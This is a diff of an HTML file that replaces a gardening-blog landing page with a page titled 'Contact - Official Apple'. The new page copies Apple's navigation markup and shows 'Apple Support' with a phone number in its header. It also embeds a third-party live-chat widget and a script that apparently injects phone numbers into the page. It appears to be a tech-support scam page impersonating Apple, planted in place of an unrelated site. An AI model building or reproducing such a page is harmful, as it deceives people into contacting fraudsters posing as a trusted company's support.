@@ -1,809 +1,384 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fairmoss Thorn Pavilion — Cultivation Meets Craft</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,100..900;1,9..144,100..900&display=swap" rel="stylesheet">
-    <style>
-        /* ---------- Reset & Base ---------- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-        body {
-            font-family: "Söhne", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #F8F5F0;
-            color: #1E352F;
-            line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-CoH4izUuyUtKORtPE9aYM.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-        /* ---------- Typography ---------- */
-        h1, h2, h3, h4, h5, h6 {
-            font-family: "Fraunces", serif;
-            font-weight: 500;
-            letter-spacing: -0.02em;
-            line-height: 1.2;
-        }
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
-
-        /* ---------- Layout & Container ---------- */
-        .container {
-            max-width: 1280px;
-            margin: 0 auto;
-            padding: 0 2rem;
-        }
-
-        /* ---------- Navigation (Hideaway Style) ---------- */
-        .site-nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            padding: 1.2rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 100;
-            background: rgba(30, 53, 47, 0.85);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            transition: all 0.3s ease;
-        }
-
-        .nav-logo {
-            font-family: "Fraunces", serif;
-            font-size: 1.6rem;
-            font-weight: 600;
-            color: #F8F5F0;
-            letter-spacing: -0.02em;
-        }
-        .nav-logo span {
-            color: #D4A373;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 2.5rem;
-            list-style: none;
-            font-weight: 450;
-            color: rgba(255, 255, 255, 0.85);
-        }
-
-        .nav-links a {
-            font-size: 0.9rem;
-            letter-spacing: 0.03em;
-            text-transform: uppercase;
-            transition: color 0.2s;
-            position: relative;
-        }
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            bottom: -4px;
-            left: 0;
-            width: 0;
-            height: 1px;
-            background: #D4A373;
-            transition: width 0.3s;
-        }
-        .nav-links a:hover::after {
-            width: 100%;
-        }
-        .nav-links a:hover {
-            color: #D4A373;
-        }
-
-        .nav-cta {
-            background: #D4A373;
-            color: #1E352F;
-            padding: 0.5rem 1.4rem;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            transition: background 0.2s;
-        }
-        .nav-cta:hover {
-            background: #b88a5e;
-            color: #fff;
-        }
-        .nav-cta:hover::after {
-            width: 0 !important;
-        }
-
-        /* ---------- 1. The Threshold (Hero) ---------- */
-        .hero-threshold {
-            margin-top: 80px;
-            background: #1E352F;
-            padding: 5rem 0 4rem;
-            position: relative;
-        }
-        .hero-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
-            align-items: center;
-        }
-        .hero-quote {
-            font-family: "Fraunces", serif;
-            font-size: 3.2rem;
-            font-weight: 400;
-            line-height: 1.1;
-            color: #F8F5F0;
-            letter-spacing: -0.02em;
-        }
-        .hero-quote em {
-            color: #D4A373;
-            font-style: italic;
-        }
-        .hero-image {
-            border-radius: 4px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.6);
-            background: #9C7A64;
-            height: 300px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #F8F5F0;
-            font-size: 1.2rem;
-            letter-spacing: 0.1em;
-            text-transform: uppercase;
-        }
-        .hero-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        /* Seasonal Pillars */
-        .pillars-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 1.5rem;
-            margin-top: 3rem;
-        }
-        .pillar-item {
-            background: rgba(255,255,255,0.04);
-            padding: 1.5rem 1rem;
-            text-align: center;
-            border-radius: 2px;
-            border-bottom: 2px solid #D4A373;
-            transition: background 0.25s;
-            color: #F8F5F0;
-        }
-        .pillar-item:hover {
-            background: rgba(255,255,255,0.08);
-        }
-        .pillar-item h3 {
-            font-size: 1rem;
-            font-weight: 600;
-            letter-spacing: 0.05em;
-            text-transform: uppercase;
-        }
-        .pillar-item p {
-            font-size: 0.8rem;
-            opacity: 0.7;
-            margin-top: 0.3rem;
-        }
-
-        /* ---------- 2. The Conservatory (Split Screen) ---------- */
-        .conservatory {
-            padding: 5rem 0;
-            background: #F8F5F0;
-        }
-        .split-screen {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 3rem;
-        }
-        .editor-picks {
-            border-right: 1px solid #e0d8cd;
-            padding-right: 2rem;
-        }
-        .editor-picks h2 {
-            font-size: 1.8rem;
-            margin-bottom: 2rem;
-            letter-spacing: -0.02em;
-        }
-        .pick-item {
-            padding: 1rem 0;
-            border-bottom: 1px solid #e8e1d6;
-        }
-        .pick-item:last-child {
-            border-bottom: 0;
-        }
-        .pick-item .meta {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            color: #9C7A64;
-        }
-        .pick-item h4 {
-            font-size: 1.1rem;
-            font-weight: 500;
-            margin: 0.2rem 0 0.2rem;
-        }
-        .pick-item p {
-            font-size: 0.9rem;
-            opacity: 0.75;
-        }
-
-        .featured-card {
-            background: #F8F5F0;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 12px 30px -8px rgba(30, 53, 47, 0.12);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        .featured-card:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 20px 40px -12px rgba(30, 53, 47, 0.2);
-        }
-        .featured-card .card-img {
-            height: 200px;
-            background: #9C7A64;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #F8F5F0;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-        }
-        .featured-card .card-img img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .featured-card .card-body {
-            padding: 1.8rem 2rem;
-        }
-        .featured-card .card-body .tag {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: #9C7A64;
-            border: 1px solid #d4c9bc;
-            padding: 0.2rem 0.8rem;
-            border-radius: 40px;
-            display: inline-block;
-            margin-bottom: 0.8rem;
-        }
-        .featured-card .card-body h3 {
-            font-size: 1.8rem;
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-        }
-        .featured-card .card-body p {
-            opacity: 0.8;
-        }
-
-        /* ---------- 3. The Root Cellar (Series) ---------- */
-        .root-cellar {
-            background: #1E352F;
-            padding: 5rem 0;
-            color: #F8F5F0;
-        }
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            margin-bottom: 3rem;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            padding-bottom: 0.5rem;
-        }
-        .section-header h2 {
-            font-size: 2.2rem;
-            font-weight: 400;
-        }
-        .section-header a {
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            color: #D4A373;
-        }
-        .series-carousel {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 2rem;
-        }
-        .series-item {
-            background: rgba(255,255,255,0.04);
-            padding: 2rem 1.8rem;
-            border-radius: 4px;
-            border-left: 3px solid #D4A373;
-        }
-        .series-item .icon {
-            font-size: 2.2rem;
-            margin-bottom: 0.5rem;
-        }
-        .series-item h3 {
-            font-size: 1.3rem;
-            font-weight: 500;
-        }
-        .series-item .progress {
-            margin-top: 1.2rem;
-            background: rgba(255,255,255,0.1);
-            height: 4px;
-            border-radius: 4px;
-            width: 100%;
-        }
-        .series-item .progress .bar {
-            height: 4px;
-            border-radius: 4px;
-            background: #D4A373;
-            width: 60%;
-        }
-
-        /* ---------- 4. The Arboretum (Category Grid) ---------- */
-        .arboretum {
-            padding: 5rem 0;
-            background: #C5D1C5;
-        }
-        .arboretum .section-header h2 {
-            color: #1E352F;
-        }
-        .category-masonry {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 1.5rem;
-        }
-        .category-card {
-            padding: 2rem 1.5rem;
-            border-radius: 12px;
-            color: #1E352F;
-            transition: all 0.3s ease;
-            background: #F8F5F0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-        }
-        .category-card:nth-child(1) { background: #E8DFD5; }
-        .category-card:nth-child(2) { background: #D9CBBF; }
-        .category-card:nth-child(3) { background: #E2D4C8; }
-        .category-card:nth-child(4) { background: #C5D1C5; }
-        .category-card:nth-child(5) { background: #d4c9bc; grid-column: span 2; }
-        .category-card:nth-child(6) { background: #b8aa9b; color: #F8F5F0; }
-        .category-card:hover {
-            transform: scale(1.02);
-        }
-        .category-card h3 {
-            font-size: 1.5rem;
-            font-weight: 500;
-        }
-        .category-card p {
-            font-size: 0.85rem;
-            opacity: 0.8;
-            margin-top: 0.4rem;
-        }
-
-        /* ---------- 5. The Greenhouse (Recent Growth) ---------- */
-        .greenhouse {
-            padding: 5rem 0;
-            background: #F8F5F0;
-        }
-        .tri-card {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 2rem;
-        }
-        .tri-card .card {
-            background: #fff;
-            border-radius: 6px;
-            overflow: hidden;
-            box-shadow: 0 8px 20px -10px rgba(0,0,0,0.06);
-        }
-        .tri-card .card:nth-child(1) {
-            border-radius: 40px 6px 40px 6px;
-            background: #F8F5F0;
-            border: 1px solid #e0d8cd;
-        }
-        .tri-card .card:nth-child(2) {
-            border-radius: 6px 40px 6px 40px;
-            background: #C5D1C5;
-            color: #1E352F;
-        }
-        .tri-card .card:nth-child(3) {
-            border-radius: 0 0 30px 0;
-            box-shadow: 12px 12px 0 rgba(30, 53, 47, 0.05);
-        }
-        .tri-card .card .card-content {
-            padding: 2rem 1.8rem;
-        }
-        .tri-card .card .card-content .label {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: #9C7A64;
-        }
-        .tri-card .card .card-content h4 {
-            font-size: 1.4rem;
-            font-weight: 500;
-            margin: 0.3rem 0;
-        }
-        .tri-card .card .card-content p {
-            font-size: 0.9rem;
-            opacity: 0.8;
-        }
-
-        /* ---------- 6. The Garden Shed (Newsletter) ---------- */
-        .garden-shed {
-            background: #2b423a;
-            padding: 4rem 0;
-            color: #F8F5F0;
-        }
-        .shed-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 3rem;
-            align-items: center;
-        }
-        .shed-grid h2 {
-            font-size: 2.4rem;
-            font-weight: 400;
-        }
-        .shed-grid p {
-            opacity: 0.75;
-            margin: 0.5rem 0 1.5rem;
-            max-width: 80%;
-        }
-        .shed-grid input {
-            padding: 0.8rem 1.2rem;
-            border: 0;
-            border-radius: 40px;
-            width: 60%;
-            margin-right: 0.5rem;
-            background: #F8F5F0;
-            color: #1E352F;
-            font-family: inherit;
-            font-size: 0.9rem;
-        }
-        .shed-grid button {
-            background: #D4A373;
-            border: 0;
-            padding: 0.8rem 1.8rem;
-            border-radius: 40px;
-            font-weight: 600;
-            color: #1E352F;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-family: inherit;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-        }
-        .shed-grid button:hover {
-            background: #b88a5e;
-            color: #fff;
-        }
-        .shed-tools {
-            display: flex;
-            gap: 1.5rem;
-            justify-content: flex-end;
-        }
-        .shed-tools span {
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            opacity: 0.6;
-            border-bottom: 1px dotted rgba(255,255,255,0.2);
-            padding-bottom: 4px;
-        }
-
-        /* ---------- Footer (Split-Stack) ---------- */
-        .site-footer {
-            background: #14241f;
-            color: #a8b8b0;
-            padding: 3rem 0 2rem;
-        }
-        .footer-principles {
-            padding: 2rem 0 3rem;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            text-align: center;
-        }
-        .footer-principles a {
-            font-family: "Fraunces", serif;
-            font-size: 2.2rem;
-            font-weight: 300;
-            color: #F8F5F0;
-            letter-spacing: -0.02em;
-            transition: color 0.2s;
-        }
-        .footer-principles a:hover {
-            color: #D4A373;
-        }
-        .footer-links {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 2rem;
-            padding-top: 2.5rem;
-            font-size: 0.8rem;
-        }
-        .footer-links h4 {
-            color: #F8F5F0;
-            font-weight: 500;
-            margin-bottom: 0.8rem;
-            font-size: 0.9rem;
-        }
-        .footer-links ul {
-            list-style: none;
-        }
-        .footer-links ul li {
-            margin-bottom: 0.5rem;
-        }
-        .footer-links ul li a {
-            opacity: 0.6;
-            transition: opacity 0.2s;
-        }
-        .footer-links ul li a:hover {
-            opacity: 1;
-            color: #D4A373;
-        }
-        .footer-bottom {
-            margin-top: 3rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.7rem;
-            opacity: 0.4;
-        }
-
-        /* ---------- Responsive ---------- */
-        @media (max-width: 1024px) {
-            .hero-grid { grid-template-columns: 1fr; }
-            .pillars-grid { grid-template-columns: repeat(2,1fr); }
-            .split-screen { grid-template-columns: 1fr; }
-            .editor-picks { border-right: 0; padding-right: 0; }
-            .category-masonry { grid-template-columns: repeat(2,1fr); }
-            .tri-card { grid-template-columns: 1fr; }
-            .shed-grid { grid-template-columns: 1fr; }
-            .footer-links { grid-template-columns: repeat(2,1fr); }
-        }
-        @media (max-width: 640px) {
-            .nav-links { display: none; }
-            .hero-quote { font-size: 2.2rem; }
-            .pillars-grid { grid-template-columns: 1fr; }
-            .category-masonry { grid-template-columns: 1fr; }
-            .category-card:nth-child(5) { grid-column: span 1; }
-            .shed-grid input { width: 100%; margin-bottom: 0.5rem; }
-        }
-    </style>
 </head>
+
 <body>
-
-    <!-- Navigation -->
-    <nav class="site-nav">
-        <div class="nav-logo">Fairmoss Thorn Pavillion<span>.</span></div>
-        <ul class="nav-links">
-          <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-					 <li><a href="categories.html">CATEGORIES</a></li>
-					<li><a href="disclamier.html">DISCLAMIER</a></li>
-        </ul>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
     </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-    <!-- 1. The Threshold -->
-    <section class="hero-threshold">
-        <div class="container">
-            <div class="hero-grid">
-                <div class="hero-quote">
-                    “The garden is a <em>pavilion</em> of patience,<br> 
-                    where every thorn tells a story.”
-                </div>
-                <div class="hero-image">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='300' viewBox='0 0 600 300'%3E%3Crect width='600' height='300' fill='%239C7A64'/%3E%3Ctext x='50%25' y='50%25' font-family='Fraunces, serif' font-size='18' fill='%23F8F5F0' text-anchor='middle' dominant-baseline='central'%3E%3C%2Ftext%3E%3C/svg%3E" alt="Fairmoss Thorn Pavilion Hero Image of a sculptural garden">
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-481-2925 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <div class="pillars-grid">
-                <div class="pillar-item"><h3>Soil Health</h3><p>Foundation of the ecosystem</p></div>
-                <div class="pillar-item"><h3>Pruning</h3><p>The art of careful removal</p></div>
-                <div class="pillar-item"><h3>Propagation</h3><p>Creating new life</p></div>
-                <div class="pillar-item"><h3>Pest Control</h3><p>Balanced defense</p></div>
-            </div>
-        </div>
-    </section>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    <!-- 2. The Conservatory -->
-    <section class="conservatory">
-        <div class="container">
-            <div class="split-screen">
-                <div class="editor-picks">
-                    <h2>Editor’s Picks</h2>
-                    <div class="pick-item">
-                        <span class="meta">Deep Dive</span>
-                        <h4>Building a No-Dig Garden</h4>
-                        <p>Why disturbing the soil is the biggest mistake you can make.</p>
-                    </div>
-                    <div class="pick-item">
-                        <span class="meta">Tool Guide</span>
-                        <h4>Essential Pruners for Every Hand</h4>
-                        <p>From bypass to anvil, find your perfect match.</p>
-                    </div>
-                    <div class="pick-item">
-                        <span class="meta">Plant Profile</span>
-                        <h4>The Resilience of the Thorn</h4>
-                        <p>Plants that protect themselves and inspire us.</p>
-                    </div>
-                </div>
-                <div class="featured-card">
-                    <div class="card-img">
-                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='200' viewBox='0 0 600 200'%3E%3Crect width='600' height='200' fill='%23D4A373'/%3E%3Ctext x='50%25' y='50%25' font-family='Fraunces, serif' font-size='16' fill='%231E352F' text-anchor='middle' dominant-baseline='central'%3EFeatured Article Image%3C%2Ftext%3E%3C/svg%3E" alt="Featured Article">
-                    </div>
-                    <div class="card-body">
-                        <span class="tag">Masterclass</span>
-                        <h3>Grafting: The Ancient Art of Union</h3>
-                        <p>Unlock the secrets of combining two plants into one. A step-by-step guide to creating stronger, more resilient cultivars.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-    <!-- 3. The Root Cellar -->
-    <section class="root-cellar">
-        <div class="container">
-            <div class="section-header">
-                <h2>Deep Dives</h2>
-                <a href="#">View all series →</a>
-            </div>
-            <div class="series-carousel">
-                <div class="series-item">
-                    <div class="icon">🌱</div>
-                    <h3>Composting Mastery</h3>
-                    <p>From kitchen scraps to black gold.</p>
-                    <div class="progress"><div class="bar" style="width:80%"></div></div>
-                </div>
-                <div class="series-item">
-                    <div class="icon">🌿</div>
-                    <h3>Water-Wise Gardening</h3>
-                    <p>Thriving in a drier climate.</p>
-                    <div class="progress"><div class="bar" style="width:45%"></div></div>
-                </div>
-                <div class="series-item">
-                    <div class="icon">🌸</div>
-                    <h3>Perennial Design</h3>
-                    <p>Building a garden that lasts.</p>
-                    <div class="progress"><div class="bar" style="width:20%"></div></div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 4. The Arboretum -->
-    <section class="arboretum">
-        <div class="container">
-            <div class="section-header">
-                <h2>Explore the Grounds</h2>
-                <a href="#">All categories →</a>
-            </div>
-            <div class="category-masonry">
-                <div class="category-card"><h3>🌳 Trees & Shrubs</h3><p>The backbone of the garden.</p></div>
-                <div class="category-card"><h3>🌼 Perennials</h3><p>Reliable, returning beauty.</p></div>
-                <div class="category-card"><h3>🥬 Edibles</h3><p>From seed to table.</p></div>
-                <div class="category-card"><h3>🧰 Tools</h3><p>Essentials for the craft.</p></div>
-                <div class="category-card"><h3>🏡 Garden Design</h3><p>Creating outdoor rooms.</p></div>
-                <div class="category-card"><h3>🌎 Ecology</h3><p>Gardening with nature.</p></div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 5. The Greenhouse -->
-    <section class="greenhouse">
-        <div class="container">
-            <div class="section-header">
-                <h2>Recent Growth</h2>
-                <a href="#">The Archive →</a>
-            </div>
-            <div class="tri-card">
-                <div class="card">
-                    <div class="card-content">
-                        <span class="label">Field Note</span>
-                        <h4>Mycorrhizal Networks</h4>
-                        <p>How fungi connect and support your plants in ways you can't see.</p>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
                     </div>
-                </div>
-                <div class="card">
-                    <div class="card-content">
-                        <span class="label">Seed Packet</span>
-                        <h4>Heirloom Tomato Varieties</h4>
-                        <p>Preserving flavor and history in your backyard.</p>
-                    </div>
-                </div>
-                <div class="card">
-                    <div class="card-content">
-                        <span class="label">Pressed Specimen</span>
-                        <h4>Leaf Anatomy & Function</h4>
-                        <p>A deep look at the powerhouse of the plant.</p>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
-    </section>
+        </section>
+    </div>
 
-    <!-- 6. The Garden Shed -->
-    <section class="garden-shed">
-        <div class="container">
-            <div class="shed-grid">
-                <div>
-                    <h2>Join the Pavilion</h2>
-                    <p>Get weekly insights, tools, and deep dives delivered to your digital doorstep.</p>
-                    <input type="email" placeholder="Your email address">
-                    <button>Subscribe</button>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
